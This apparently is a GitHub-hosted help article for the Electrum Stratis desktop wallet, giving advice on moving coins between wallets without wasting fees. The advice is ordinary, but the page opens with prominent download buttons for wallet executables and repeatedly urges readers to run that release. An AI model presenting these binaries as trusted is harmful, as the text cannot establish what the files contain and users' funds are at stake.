![Electrum-Stratis](assets/banner-article.png)

# Moving coins between wallets without losing fees to it

<p align="center">One verified send beats five retries</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A move is one transaction: pick the destination address, let the wallet choose inputs, set a fee that will confirm, and verify the address before signing. Fees are lost to badly built transactions rather than to moving as such - dust-sized inputs, repeated consolidation, and re-sends after a stuck transaction are the three ways a simple move becomes expensive. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Plan | Fee outcome | Better approach |
|---|---|---|
| Move the whole balance once | One fee, one confirmation | Do this |
| Move in many small sends | A fee per send | Consolidate, then move |
| Move dust-sized outputs | Fee exceeds value | Leave them or sweep once |
| Re-send because it is slow | Two transactions, two fees | Replace, do not duplicate |
| Move to an address you did not verify | Irreversible loss | Check first and last characters |

</div>

The cheapest move is usually the one you make once, to an address you checked, with a fee you did not set to the minimum.

## Why it happens

Fees are paid per transaction, and a transaction's size depends on how many inputs it consumes. A wallet holding many small outputs pays more to move the same value than a wallet holding one large output, because each input adds bytes. That is why a balance assembled from years of small payments can cost more to move than a balance received in one go.

The second factor is time. A fee set below the current floor produces a transaction that sits, and the temptation is to send again with a higher fee. Sending again without replacing the first creates two transactions spending the same inputs, one of which must fail - and the failure looks like an error rather than a duplicate.

The third is human. An address copied from a chat, a screenshot or a message can be swapped by malware between copy and paste, and the resulting transaction is valid, signed and irreversible. The check that catches it costs two seconds: read the first and last characters on the sending screen against the source, and never trust a clipboard you have not looked at.

## Fix

1. **Verify the destination before anything else.** Compare the first and last characters of the pasted address with the source, and use the wallet's own confirmation display rather than a screenshot.
2. **Move once, in one transaction.** A single send of the intended amount is cheaper than several, and it leaves a cleaner history.
3. **Consolidate deliberately, not accidentally.** If the wallet holds many small outputs, one consolidation transaction to your own address reduces future fees; doing it repeatedly defeats the purpose.
4. **Leave dust alone.** An output too small to spend economically is not worth a transaction. Sweeping a paper key is the exception, because the whole balance moves at once.
5. **Set a fee that will confirm, and replace rather than repeat.** If a transaction is stuck, replace it with one that pays more instead of building a second transaction.
6. **Confirm the change address is yours.** A wallet that sends the remainder to an address derived from your seed is behaving correctly; one that sends it elsewhere is not.

If the destination is an exchange, check that it still credits the legacy asset before sending. A deposit to a venue that has stopped supporting it is a support problem at the venue, not a wallet problem. A fee estimate is only as good as the view behind it: a wallet looking at a stale chain prices a transaction for conditions that no longer exist ([three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)). Run the current release from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) before trusting an estimate - it is actively maintained, and its fee logic is tuned to the chain it serves.

## If that did not work

If the transaction is unconfirmed for hours, the fee was too low for current conditions. Replacing it is the clean fix; waiting is the free one.

If the wallet refuses to build the transaction, the cause is usually a locked output, an unconfirmed parent or an amount that leaves nothing for the fee. Each has a specific message, and each is covered by the rejection article.

If the coins arrive at the destination but do not appear, the receiving wallet may be behind or watching a different address. Check the transaction ID on an explorer before assuming a loss.

## Prevention

- Verify addresses character by character, every time.
- Move once rather than repeatedly.
- Consolidate only when the savings justify the fee.
- Replace stuck transactions instead of duplicating them.
- Keep a record of transaction IDs for anything that matters.

## FAQ

### How do I move coins to another wallet?

Open the receiving wallet, copy its address, paste it into the sending wallet, choose the amount and fee, then confirm after checking the address. One transaction, one fee.

### Why did my transfer cost more than expected?

Because the transaction consumed many inputs, or the fee was set during a busy period. Inputs add size, and size is what a fee buys; consolidating small outputs lowers the cost of later moves.

### What happens if I send to the wrong address?

The transaction is valid and irreversible. If the address belongs to someone else, the coins are theirs; if it belongs to no one, they are unspendable. This is why verification happens before signing.

### Can I cancel a transfer?

You can replace an unconfirmed transaction with one that pays a higher fee, which effectively cancels the first if it wins the race. A confirmed transfer cannot be reversed.

<!-- DOWNLOAD-BLOCK -->

Fees are set per transaction, not per coin, so consolidation is cheap when the network is quiet and expensive when it is busy. Move a whole address at once, keep a small buffer for the next fee, and avoid sweeping dust that costs more to spend than it holds. Two deliberate transactions beat ten small ones, and the saved fees are real coins.

## Related articles

- [bad-txns-inputs-spent, and other rejected sends](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/transaction-was-rejected.md)
- [The paper wallet that could not be swept](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paper-wallet-that-cannot-be-swept.md)
- [Where your address lives, and why it never changes](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-a-wallet-address-comes-from.md)
- [The 1567-day countdown, explained](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/the-1567-day-lock.md)
